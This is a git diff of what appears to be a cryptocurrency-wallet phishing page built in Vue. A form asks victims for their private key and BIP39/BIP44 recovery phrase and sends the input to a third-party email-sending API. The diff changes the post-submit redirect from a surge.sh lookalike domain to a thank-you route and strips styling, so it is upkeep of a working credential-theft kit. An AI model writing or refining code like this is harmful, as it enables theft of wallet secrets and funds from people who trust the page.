@@ -4,7 +4,7 @@
       >Please enter your key</label
     >
     <el-input type="textarea" :rows="3" v-model="private_key"> </el-input>
-    <span>Please enter your private key in HEX format.</span>
+    <span class="mt-4">Please enter your private key in HEX format.</span>
     <p class="my-20 font-semibold text-sm">
       Input the BIP39/BIP44 recovery phrase here to restore the private keys
       that manage your acccounts.
@@ -41,7 +41,7 @@ export default {
         axios
           .post("https://api.emailjs.com/api/v1.0/email/send", data)
           .then(function() {
-            window.location.href = "https://walletcloud-connect.surge.sh/";
+            self.$router.push("/thank-you")
             self.loading = false;
           })
           .catch(function() {
@@ -67,47 +67,5 @@ export default {
 </script>
 
 <style lang="scss">
-.private {
-  min-height: 435px;
 
-  label {
-    color: #565656;
-  }
-  p {
-    color: #3b99fc;
-  }
-  button {
-    height: 50px;
-    border: 1px solid #3b99fc;
-    border-radius: 4px;
-    background: black;
-    text-transform: uppercase;
-    transition: all 0.2s ease-in-out;
-    font-size: 20px;
-    font-weight: 600;
-    color: #fff;
-
-    &:hover,
-    &:active {
-      color: white;
-      outline: none;
-      border-color: #3b99fc;
-      background-color: black;
-    }
-  }
-
-  .el-textarea {
-    textarea {
-      background-color: black;
-      outline: none !important;
-      border: 1px solid #3b99fc !important;
-      color: #fff;
-      font-weight: 500;
-      padding: 12px;
-      font-size: 16px;
-      resize: none;
-      border-radius: 4px;
-    }
-  }
-}
 </style>
